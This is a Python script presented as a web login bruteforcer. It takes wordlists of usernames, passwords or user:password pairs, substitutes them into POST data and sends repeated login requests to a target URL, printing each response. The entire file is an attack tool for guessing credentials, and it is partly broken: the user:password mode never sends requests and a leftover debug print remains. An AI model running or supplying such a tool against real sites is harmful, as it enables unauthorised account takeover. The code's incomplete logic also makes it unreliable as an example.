#!/usr/bin/python3

import requests
import argparse
import sys


def parse_args():
    args_parser = argparse.ArgumentParser(
        description="Web login bruteforcer", usage='%(prog)s -d request_data [-uw usersfile] [-pw passwords file] [-upw user:password file] URL')

    args_parser.add_argument('URL', metavar='url',
                             type=str, help="POST login request url")
    args_parser.add_argument('-d',
                             '--data',
                             action='store',
                             required=True,
                             help='POST request data as string. use __USER__ and __PASS__ as placeholders to be changed by the program.')
    args_parser.add_argument('-uw',
                             '--users',
                             action='store',
                             help='Users file')
    args_parser.add_argument('-pw',
                             '--passwords',
                             action='store',
                             help='Passwords file')
    args_parser.add_argument('-upw',
                             '--usr_pass',
                             action='store',
                             help='user:password file')
    args = args_parser.parse_args()

    if not args.users and not args.passwords and not args.usr_pass:
        print("You must specify at least one list file")
        sys.exit(1)
    if (args.users or args.passwords) and args.usr_pass:
        print("You cannot specify user:pass file in this case. You already specified an user or password list file")
        sys.exit(1)
    if (args.users and args.passwords):
        print("Use user:pass list file with the option '-upw' instead of separate user and password files")
        sys.exit(1)
    if "__USER__" in args.data and not(args.users or args.usr_pass):
        print("__USER__ placeholder specified in request data but no users file")
        sys.exit(1)
    if "__PASS__" in args.data and not(args.passwords or args.usr_pass):
        print("__PASS__ placeholder specified in request data but no password file")
        sys.exit(1)

    cred_files = {
        'user': args.users if args.users else '',
        'pass': args.passwords if args.passwords else '',
        'user_pass': args.usr_pass if args.usr_pass else '',
    }

    return args.URL, args.data, cred_files


def get_replaced_data(data, placeholder, value):
    if value:
        data_to_replace = data
        data_to_replace = data_to_replace.replace(placeholder, value, 1)
        return data_to_replace


def send_requests(url, list_file, placeholder_data, to_replace):
    with open(list_file, "r") as lf:
        while row := lf.readline().strip():
            print(1)
            req_data = get_replaced_data(placeholder_data, to_replace, row)
            try:
                res = requests.post(url, data=req_data, timeout=5)
                print(res.content)
            except:
                print(
                    f"Error while trying to send POST request to '{url}' with data '{req_data}'")


def main():
    url, placeholder_data, files = parse_args()
    print(url, placeholder_data, files)
    if files.get("user_pass"):
        with open(files.get("user_pass"), "r") as upf:
            while usr_pass := upf.readline().strip():
                data_to_replace = placeholder_data
                usr_pass = usr_pass.split(":", 1)
                if len(usr_pass) == 2:
                    user = usr_pass[0]
                    passw = usr_pass[1]
                    data_to_replace = data_to_replace.replace(
                        "__USER__", user, 1)
                    data_to_replace = data_to_replace.replace(
                        "__PASS__", passw, 1)
                    print(data_to_replace)
    elif files.get("user"):
        send_requests(url, files.get("user"), placeholder_data, "__USER__")
    elif files.get("pass"):
        send_requests(url, files.get("pass"), placeholder_data, "__PASS__")


if __name__ == "__main__":
    main()
